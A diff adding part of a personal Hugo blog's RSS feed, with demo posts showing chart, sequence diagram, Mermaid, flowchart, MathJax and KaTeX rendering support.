+        <description>{ &amp;quot;type&amp;quot;: &amp;quot;bar&amp;quot;, &amp;quot;data&amp;quot;: { &amp;quot;labels&amp;quot;: [&amp;quot;One&amp;quot;, &amp;quot;Two&amp;quot;, &amp;quot;Three&amp;quot;, &amp;quot;Four&amp;quot;, &amp;quot;Five&amp;quot;, &amp;quot;Six&amp;quot;], &amp;quot;datasets&amp;quot;: [{ &amp;quot;label&amp;quot;: &amp;quot;# of Votes&amp;quot;, &amp;quot;data&amp;quot;: [12, 19, 3, 5, 3, 8] }] } } { &amp;quot;type&amp;quot;: &amp;quot;line&amp;quot;, &amp;quot;data&amp;quot;: { &amp;quot;labels&amp;quot;: [&amp;quot;One&amp;quot;, &amp;quot;Two&amp;quot;, &amp;quot;Three&amp;quot;, &amp;quot;Four&amp;quot;, &amp;quot;Five&amp;quot;, &amp;quot;Six&amp;quot;], &amp;quot;datasets&amp;quot;: [ { &amp;quot;label&amp;quot;: &amp;quot;# of Votes&amp;quot;, &amp;quot;data&amp;quot;: [12, 19, 3, 5, 2, 3], &amp;quot;backgroundColor&amp;quot;:&amp;quot;transparent&amp;quot;, &amp;quot;borderColor&amp;quot;:&amp;quot;orange&amp;quot; }, { &amp;quot;label&amp;quot;: &amp;quot;Some other set&amp;quot;, &amp;quot;data&amp;quot;: [15, 8, 13, 5, 5, 9], &amp;quot;backgroundColor&amp;quot;:&amp;quot;transparent&amp;quot;, &amp;quot;borderColor&amp;quot;:&amp;quot;#44ccff&amp;quot; } ] } } </description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature1/graph.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+          
+        
+        
+          
+            
+              <category>diagram</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>JS Sequence Diagram support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/test-js-sequence-diagrams/</link>
+        <pubDate>Mon, 18 Nov 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Mon, 18 Nov 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/test-js-sequence-diagrams/</guid>
+        <description>Alice-&amp;gt;Bob: Hello Bob, how are you? Note right of Bob: Bob thinks Bob--&amp;gt;Alice: I am good thanks! Title: Here is a title A-&amp;gt;B: Normal line B--&amp;gt;C: Dashed line C-&amp;gt;&amp;gt;D: Open arrow D--&amp;gt;&amp;gt;A: Dashed open arrow </description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature2/transfer.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+          
+        
+        
+          
+            
+              <category>diagram</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Mermaid support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/test-mermaid/</link>
+        <pubDate>Sun, 17 Nov 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sun, 17 Nov 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/test-mermaid/</guid>
+        <description>graph TD; A--&amp;gt;B; A--&amp;gt;C; B--&amp;gt;D; C--&amp;gt;D; sequenceDiagram participant Alice participant Bob Alice-&amp;gt;John: Hello John, how are you? loop Healthcheck John-&amp;gt;John: Fight against hypochondria end Note right of John: Rational thoughts &amp;lt;br/&amp;gt;prevail... John--&amp;gt;Alice: Great! John-&amp;gt;Bob: How about you? Bob--&amp;gt;John: Jolly good! graph TD A[Hard] --&amp;gt;|Text| B(Round) B --&amp;gt; C{Decision} C --&amp;gt;|One| D[Result 1] C --&amp;gt;|Two| E[Result 2] gantt section Section Completed :done, des1, 2014-01-06,2014-01-08 Active :active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d classDiagram Class01 &amp;lt;|-- AveryLongClass : Cool &amp;lt;&amp;lt;interface&amp;gt;&amp;gt; Class01 Class09 --&amp;gt; C2 : Where am i?</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature2/workflow.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>diagram</category>
+            
+          
+        
+        
+          
+            
+              <category>diagram</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>MathJax support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/test-mathjax/</link>
+        <pubDate>Sat, 16 Nov 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Sat, 16 Nov 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/test-mathjax/</guid>
+        <description>When $a \ne 0$, there are two solutions to $(ax^2 + bx + c = 0)$ and they are
+$$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature1/infinity.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+          
+        
+        
+          
+            
+              <category>math</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Katex support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/test-katex/</link>
+        <pubDate>Fri, 15 Nov 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Fri, 15 Nov 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/test-katex/</guid>
+        <description>The following
+$$ \int_{a}^{b} x^2 dx $$
+Is an integral
+$$ \varphi = 1+\frac{1} {1+\frac{1} {1+\frac{1} {1+\cdots} } } $$
+Enable Katex in the config file by setting the katex param to true. This will import the necessary Katex CSS/JS.
+See the online reference of supported TeX functions.
+Note: For inline math to render correctly, your content file extension must be .mmark. See the official mmark site.
+Inline math: $ \varphi = \dfrac{1+\sqrt5}{2}= 1.</description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature2/mathbook.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+          
+        
+        
+          
+            
+              <category>math</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Flowchart support</title>
+        <link>https://lurenxiao1998.github.io/en/posts/test-flowchart/</link>
+        <pubDate>Thu, 14 Nov 2019 12:00:06 +0900</pubDate>
+        <author>lurenxiao98@gmail.com (Lurenxiao)</author>
+        <atom:modified>Thu, 14 Nov 2019 12:00:06 +0900</atom:modified>
+        <guid>https://lurenxiao1998.github.io/en/posts/test-flowchart/</guid>
+        <description>st=&amp;gt;start: Start|past:&amp;gt;http://www.google.com[blank] e=&amp;gt;end: End|future:&amp;gt;http://www.google.com op1=&amp;gt;operation: My Operation|past op2=&amp;gt;operation: Stuff|current sub1=&amp;gt;subroutine: My Subroutine|invalid cond=&amp;gt;condition: Yes or No?|approved:&amp;gt;http://www.google.com c2=&amp;gt;condition: Good idea|rejected io=&amp;gt;inputoutput: catch something...|future st-&amp;gt;op1(right)-&amp;gt;cond cond(yes, right)-&amp;gt;c2 cond(no)-&amp;gt;sub1(left)-&amp;gt;op1 c2(yes)-&amp;gt;io-&amp;gt;e c2(no)-&amp;gt;op2-&amp;gt;e </description>
+        
+        <dc:creator>Lurenxiao</dc:creator>
+        <media:content url="https://lurenxiao1998.github.ioimages/feature1/flowchart.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+          
+        
+        
+          
+            
+              <category>diagram</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
